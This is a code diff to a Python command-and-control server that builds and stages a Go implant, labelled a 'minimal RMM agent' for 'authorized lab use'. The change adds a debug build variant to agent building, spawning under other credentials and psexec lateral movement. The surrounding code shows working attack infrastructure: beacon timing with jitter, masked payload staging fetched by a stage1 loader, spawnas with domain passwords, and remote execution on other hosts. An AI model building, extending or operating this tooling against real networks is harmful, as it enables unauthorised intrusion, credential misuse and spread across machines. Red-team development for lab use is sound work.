@@ -163,12 +163,12 @@ def staging_mask(payload: bytes, staging_id: str) -> bytes:
     return bytes(masked)
 
 
-def latest_go_agent_binary() -> str | None:
-    """Newest raw Windows amd64 agent binary produced by build_go_agent."""
+def latest_go_agent_binary(debug: bool = False) -> str | None:
+    """Newest raw Windows amd64 agent of exactly the requested build variant."""
     if not os.path.isdir(GO_AGENT_BUILD_DIR):
         return None
     best, best_mtime = None, -1.0
-    suffix = "minimal-rmm-agent-windows-amd64.exe"
+    suffix = "minimal-rmm-agent-debug-windows-amd64.exe" if debug else "minimal-rmm-agent-windows-amd64.exe"
     try:
         names = os.listdir(GO_AGENT_BUILD_DIR)
     except OSError:
@@ -600,7 +600,7 @@ def render_configured_client_script(
     return rendered
 
 
-def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, process_owner=None, stageless: bool = False, staging_fn=None) -> dict:
+def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, process_owner=None, stageless: bool = False, staging_fn=None, debug: bool = False) -> dict:
     """Build a fixed repository Go agent for one allowlisted OS and architecture.
 
     Staged build (default, stageless=False, staging_fn provided):
@@ -610,11 +610,19 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
 
     Stageless build (stageless=True or staging_fn not provided):
       Returns the full Go agent binary directly in the ZIP (current behaviour).
+
+    Debug build (debug=True, requires stageless=True):
+      Compiles the rmmdebug implementation into a separately named companion.
+      The supplied launcher enables diagnostics; normal builds omit that code.
     """
     goos = str(goos or "").strip().lower()
     goarch = str(goarch or "").strip().lower()
     if (goos, goarch) not in GO_AGENT_TARGETS:
         raise ValueError("unsupported Go target")
+    if not isinstance(debug, bool):
+        raise ValueError("debug must be a boolean")
+    if debug and not stageless:
+        raise ValueError("debug builds require stageless=true")
     root = os.path.realpath(GO_AGENT_DIR)
     if not os.path.isdir(root) or not os.path.isfile(os.path.join(root, "go.mod")):
         raise FileNotFoundError("Go agent source is not installed")
@@ -634,10 +642,10 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
         # needs write access for its generated service embed.
         os.chmod(build_root, 0o700)
         return _build_go_agent_from_source(
-            build_root, go_bin, goos, goarch, agent_config, process_owner, stageless, staging_fn)
+            build_root, go_bin, goos, goarch, agent_config, process_owner, stageless, staging_fn, debug)
 
 
-def _build_go_agent_from_source(root, go_bin, goos, goarch, agent_config, process_owner, stageless, staging_fn):
+def _build_go_agent_from_source(root, go_bin, goos, goarch, agent_config, process_owner, stageless, staging_fn, debug=False):
     """Compile and package an agent using one disposable source snapshot."""
     agent_config = agent_config if isinstance(agent_config, dict) else {}
     config_values = {}
@@ -667,10 +675,11 @@ def _build_go_agent_from_source(root, go_bin, goos, goarch, agent_config, proces
     if not 1 <= sleep_seconds <= 3600 or not 0 <= jitter_percent <= 100:
         raise ValueError("Go beacon timing is outside the allowed range")
     suffix = ".exe" if goos == "windows" else ""
-    binary_filename = f"minimal-rmm-agent-{goos}-{goarch}{suffix}"
+    variant = "minimal-rmm-agent-debug" if debug else "minimal-rmm-agent"
+    binary_filename = f"{variant}-{goos}-{goarch}{suffix}"
     build_id = secrets.token_hex(16)
     binary_path = safe_join_under(GO_AGENT_BUILD_DIR, f"{build_id}-{binary_filename}")
-    filename = f"minimal-rmm-agent-{goos}-{goarch}-{build_id}.zip"
+    filename = f"{variant}-{goos}-{goarch}-{build_id}.zip"
     output_path = safe_join_under(GO_AGENT_BUILD_DIR, filename)
     go_cache = safe_join_under(LOG_DIR, "go-cache")
     os.makedirs(go_cache, exist_ok=True)
@@ -810,6 +819,8 @@ def _build_go_agent_from_source(root, go_bin, goos, goarch, agent_config, proces
                 "build",
                 "-buildvcs=false",
                 "-trimpath",
+                # Explicit tags override any inherited GOFLAGS tag selection.
+                "-tags=rmmdebug" if debug else "-tags=",
                 "-ldflags",
                 ldflags,
                 "-o",
@@ -900,6 +911,7 @@ Authorized lab use only.
             "workspace_id": config_values["workspace_id"] or None,
             "goos": goos,
             "goarch": goarch,
+            "debug": debug,
             "sha256": digest.hexdigest(),
             "size": os.path.getsize(staged_output),
             "path": staged_output,
@@ -918,6 +930,8 @@ Authorized lab use only.
         "RMM_JITTER_PERCENT": str(jitter_percent),
         "RMM_HTTP_PROXY": config_values["http_proxy"],
     }
+    if debug:
+        configured["RMM_DEBUG"] = "1"
     if goos == "windows":
         launcher_config = "".join(
             f"$env:{name} = '{value.replace(chr(39), chr(39) * 2)}'\n"
@@ -978,6 +992,9 @@ Workspace binding: RMM_AGENT_WORKSPACE_ID (embedded in configured builds).
 
 Authorized lab use only.
 """
+    if debug:
+        readme += "\nDebug build: run-agent.ps1 enables local diagnostics with RMM_DEBUG=1.\n"
+        readme += "Copy the debug executable beside the normal agent to use spawnas -d.\n"
     with zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
         archive.write(binary_path, arcname=binary_filename)
         archive.writestr(launcher_name, launcher)
@@ -992,6 +1009,7 @@ Authorized lab use only.
         "workspace_id": config_values["workspace_id"] or None,
         "goos": goos,
         "goarch": goarch,
+        "debug": debug,
         "sha256": digest.hexdigest(),
         "size": os.path.getsize(output_path),
         "path": output_path,
@@ -3081,7 +3099,7 @@ class RMMServer:
         return payload, "ok"
 
     def spawn_session(self, session_id_or_prefix, verify=True, spawn_timeout=120.0,
-                      register_timeout=60.0, verify_timeout=120.0):
+                      register_timeout=60.0, verify_timeout=120.0, debug=False):
         """Request a detached Go agent and prove its expected registration."""
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -3090,7 +3108,8 @@ class RMMServer:
             return None, "agent_type_unsupported"
         spawned_id = self._new_deployment_id("spawn")
         command = SPAWN_COMMAND + "\n" + json.dumps({
-            "session_id": spawned_id, "workspace_id": getattr(session, "workspace_id", None) or ""}, separators=(",", ":"))
+            "session_id": spawned_id, "workspace_id": getattr(session, "workspace_id", None) or "",
+            "debug": debug}, separators=(",", ":"))
         self.record_operator_action(session, SPAWN_COMMAND, "spawn")
         event, status = self.exec_and_wait(session.id, command, timeout=spawn_timeout)
         if status not in ("ok", "timeout"):
@@ -3210,8 +3229,9 @@ class RMMServer:
                 "session_id": session.id, "output": body}, "ok"
 
     def spawnas(self, session_id_or_prefix, workspace_dir, domain, user, password,
-                verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0):
-        """Spawn a new agent copy under a different process identity using the cascade.
+                verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0,
+                debug=False):
+        """Spawn under a different identity, with optional local debug diagnostics.
 
         Credentials are resolved server-side; only the identity label travels in
         operator events, never the password.
@@ -3232,7 +3252,7 @@ class RMMServer:
         command = SPAWNAS_COMMAND + "\n" + json.dumps(
             {"session_id": spawned_id,
              "workspace_id": getattr(session, "workspace_id", None) or "",
-             "domain": domain, "user": user, "password": password or ""},
+             "domain": domain, "user": user, "password": password or "", "debug": debug},
             separators=(",", ":"),
         )
         self.record_operator_action(session, f"{SPAWNAS_COMMAND} {identity}", "spawnas")
@@ -3286,7 +3306,7 @@ class RMMServer:
         return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
-                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0):
+                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, debug=False):
         """Request remote execution; only the expected new agent proves deployment."""
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -3304,15 +3324,15 @@ class RMMServer:
         if method == "psexec":
             # The listener stages the current agent build; stage1 fetches it
             # with the staging reference as its only capability.
-            agent_binary = latest_go_agent_binary()
+            agent_binary = latest_go_agent_binary(debug=True) if debug else latest_go_agent_binary()
             if not agent_binary:
-                return None, "agent_payload_unavailable"
+                return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
             try:
                 with open(agent_binary, "rb") as handle:
                     stage_id = self.create_staging(handle.read())
             except OSError as exc:
                 self.log(f"Staging the agent payload failed: {exc}", "WARNING")
-                return None, "agent_payload_unavailable"
+                return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
         # Reserve response time for delivery and the final result instead of
         # expiring the worker and its server waiter at the same instant.
         worker_timeout = float(exec_timeout)
@@ -3323,7 +3343,7 @@ class RMMServer:
         command = LATERAL_COMMAND + "\n" + json.dumps({
             "method": method, "host": host, "timeout_seconds": worker_timeout,
             "session_id": target_id, "workspace_id": getattr(session, "workspace_id", None) or "",
-            "stage": stage_id}, separators=(",", ":"))
+            "stage": stage_id, "debug": debug}, separators=(",", ":"))
         self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}", "lateral")
         event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
         if status not in ("ok", "timeout"):
@@ -5154,6 +5174,10 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["agent", "go", "build"]:
+            debug = body.get("debug", False)
+            if not isinstance(debug, bool):
+                self._json(400, {"error": "invalid_agent_config", "detail": "debug must be a boolean"})
+                return True
             config = body.get("config", {})
             if not isinstance(config, dict):
                 self._json(400, {"error": "invalid_agent_config", "detail": "config must be a JSON object"})
@@ -5189,6 +5213,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     process_owner=srv.builds,
                     stageless=bool(body.get("stageless", False)),
                     staging_fn=lambda payload: srv.create_staging(payload, ttl_seconds=STAGING_BUILD_TTL_SECONDS),
+                    debug=debug,
                 )
             except ValueError as exc:
                 self._json(400, {"error": "invalid_target", "detail": str(exc)})
@@ -5255,11 +5280,14 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             try:
                 verify = body.get("verify", True)
+                debug = body.get("debug", False)
                 spawn_timeout = float(body.get("spawn_timeout", 120))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
+                if not isinstance(debug, bool):
+                    raise ValueError("debug must be a boolean")
                 if not all(1 <= value <= 3600
                            for value in (spawn_timeout, register_timeout, verify_timeout)):
                     raise ValueError("spawn timeouts must be between 1 and 3600 seconds")
@@ -5272,6 +5300,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 spawn_timeout=spawn_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
+                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -5379,11 +5408,14 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             try:
                 verify = body.get("verify", True)
+                debug = body.get("debug", False)
                 spawn_timeout = float(body.get("spawn_timeout", 120))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
+                if not isinstance(debug, bool):
+                    raise ValueError("debug must be a boolean")
                 if not all(1 <= v <= 3600 for v in (spawn_timeout, register_timeout, verify_timeout)):
                     raise ValueError("spawnas timeouts must be between 1 and 3600 seconds")
             except (TypeError, ValueError):
@@ -5414,6 +5446,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 spawn_timeout=spawn_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
+                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -5507,11 +5540,14 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             try:
                 verify = body.get("verify", True)
+                debug = body.get("debug", False)
                 exec_timeout = float(body.get("exec_timeout", 300))
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
                 if not isinstance(verify, bool):
                     raise ValueError("verify must be a boolean")
+                if not isinstance(debug, bool):
+                    raise ValueError("debug must be a boolean")
                 if not all(1 <= value <= 3600
                            for value in (exec_timeout, register_timeout, verify_timeout)):
                     raise ValueError("lateral timeouts must be between 1 and 3600 seconds")
@@ -5526,6 +5562,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout=exec_timeout,
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
+                debug=debug,
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -5536,6 +5573,9 @@ class RMMHandler(BaseHTTPRequestHandler):
             elif status == "agent_payload_unavailable":
                 self._json(503, {"error": status,
                                  "detail": "No Windows agent build is staged on the server; run build_go_agent first."})
+            elif status == "debug_payload_unavailable":
+                self._json(503, {"error": status,
+                                 "detail": "No readable Windows amd64 debug agent is available; build the separate debug artifact first."})
             elif status == "session_killed":
                 self._json(410, {"error": status})
             elif status == "server_stopped":
